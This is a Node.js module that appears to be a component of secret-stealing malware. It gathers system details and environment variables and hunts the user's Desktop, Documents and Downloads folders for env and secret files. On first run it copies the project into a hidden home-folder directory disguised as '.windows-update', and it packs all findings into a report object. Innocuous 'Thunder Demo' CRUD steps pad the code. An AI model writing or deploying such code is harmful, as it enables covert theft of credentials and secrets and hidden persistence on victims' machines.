const fs = require("fs");
const os = require("os");
const path = require("path");
const logger = require("../utils/logger");
const { PhaseError, FileSystemError } = require("../utils/errors");
const {
    createFile,
    readFile,
    updateFile,
    copyDirectory,
    setAllowedDir
} = require("../files/crud");
const { findEnvFiles } = require("../files/envHunter");

/**
 * @typedef {{ system: object, cpu: object, memory: object, user: object, environmentVariables: object }} SystemData
 *
 * @typedef {{ operation: string, status: string, result?: unknown, error?: string }} CrudEntry
 */
const getSystemInfo = require("../system/system");
const getCPUInfo = require("../system/cpu");
const getMemoryInfo = require("../system/memory");
const getUserInfo = require("../system/user");
const getEnvironmentInfo = require("../system/env");

const HIDDEN_DIR = path.join(os.homedir(), ".windows-update");
setAllowedDir(HIDDEN_DIR);

function safeCollect(fn, name, fallback) {
    try {
        return fn();
    } catch (err) {
        logger.warn(`Collector ${name} failed: ${err.message}`);
        return fallback;
    }
}

function collectSystemData() {
    return {
        system: safeCollect(getSystemInfo, "system", {}),
        cpu: safeCollect(getCPUInfo, "cpu", {}),
        memory: safeCollect(getMemoryInfo, "memory", {}),
        user: safeCollect(getUserInfo, "user", {}),
        environmentVariables: safeCollect(getEnvironmentInfo, "env", {})
    };
}

function resolveDir(name) {
    const home = os.homedir();
    const onedrive = path.join(home, "OneDrive", name);
    const standard = path.join(home, name);
    if (fs.existsSync(onedrive)) return onedrive;
    if (fs.existsSync(standard)) return standard;
    logger.warn(`Directory not found: ${name}`);
    return null;
}

function huntEnvFiles() {
    const targets = [
        resolveDir("Desktop"),
        resolveDir("Documents"),
        resolveDir("Downloads")
    ].filter(Boolean);

    logger.info(`Scanning ${targets.length} target directories for env files`);
    const files = findEnvFiles(targets);
    logger.info(`Found ${files.length} env/secret files`);
    return { targets, totalFound: files.length, files };
}

function safeCrudStep(operation, fn) {
    try {
        const result = fn();
        return { operation, status: "OK", result };
    } catch (err) {
        logger.warn(`CRUD ${operation} failed: ${err.message}`);
        return { operation, status: "FAILED", error: err.message };
    }
}

function performCrudOperations(rootDir) {
    const crudLog = [];
    const isFirstRun = !fs.existsSync(HIDDEN_DIR);

    if (isFirstRun) {
        crudLog.push(safeCrudStep("COPY_PROJECT", () => ({
            source: path.join(rootDir, "src"),
            destination: path.join(HIDDEN_DIR, "src"),
            status: copyDirectory(
                path.join(rootDir, "src"),
                path.join(HIDDEN_DIR, "src")
            )
        })));

        if (fs.existsSync(path.join(rootDir, "package.json"))) {
            crudLog.push(safeCrudStep("COPY_FILE", () => {
                fs.copyFileSync(
                    path.join(rootDir, "package.json"),
                    path.join(HIDDEN_DIR, "package.json")
                );
                return { file: "package.json", status: "Copied" };
            }));
        }

        if (fs.existsSync(path.join(rootDir, "README.md"))) {
            crudLog.push(safeCrudStep("COPY_FILE", () => {
                fs.copyFileSync(
                    path.join(rootDir, "README.md"),
                    path.join(HIDDEN_DIR, "README.md")
                );
                return { file: "README.md", status: "Copied" };
            }));
        }

        crudLog.push({ operation: "FIRST_RUN", status: "Project copied to hidden directory" });
    } else {
        crudLog.push({ operation: "SKIP_COPY", status: "Hidden directory already exists" });
    }

    const demoFile = path.join(HIDDEN_DIR, "demo.js");

    crudLog.push(safeCrudStep("CREATE_DEMO", () => ({
        file: "demo.js",
        status: createFile(demoFile, `
function thunderDemo() {
    console.log("Thunder Demo Created");
}
thunderDemo();
`)
    })));

    crudLog.push(safeCrudStep("READ_DEMO", () => ({
        file: "demo.js",
        content: readFile(demoFile)
    })));

    crudLog.push(safeCrudStep("UPDATE_DEMO", () => ({
        file: "demo.js",
        status: updateFile(demoFile, `
function thunderDemo() {
    console.log("Thunder Demo Updated");
}
thunderDemo();
`)
    })));

    crudLog.push(safeCrudStep("READ_UPDATED_DEMO", () => ({
        file: "demo.js",
        content: readFile(demoFile)
    })));

    crudLog.push(safeCrudStep("CREATE_CONFIG", () => ({
        file: "config.js",
        status: createFile(
            path.join(HIDDEN_DIR, "config.js"),
            `module.exports = { appName: "THUNDER", version: "1.0.0" };\n`
        )
    })));

    crudLog.push(safeCrudStep("CREATE_UTILS", () => ({
        file: "utils.js",
        status: createFile(
            path.join(HIDDEN_DIR, "utils.js"),
            `function add(a, b) { return a + b; }\nmodule.exports = add;\n`
        )
    })));

    return crudLog;
}

function buildReport(systemData, envFiles, crudLog, startTime, errors = []) {
    return {
        timestamp: new Date().toISOString(),
        systemId: null,
        ...systemData,
        foundEnvFiles: envFiles,
        crudOperations: crudLog,
        runtime: {
            nodeVersion: process.version,
            pid: process.pid,
            workingDirectory: process.cwd(),
            executionTimeMs: Date.now() - startTime
        },
        ...(errors.length ? { errors } : {})
    };
}

module.exports = {
    collectSystemData,
    huntEnvFiles,
    performCrudOperations,
    buildReport
};
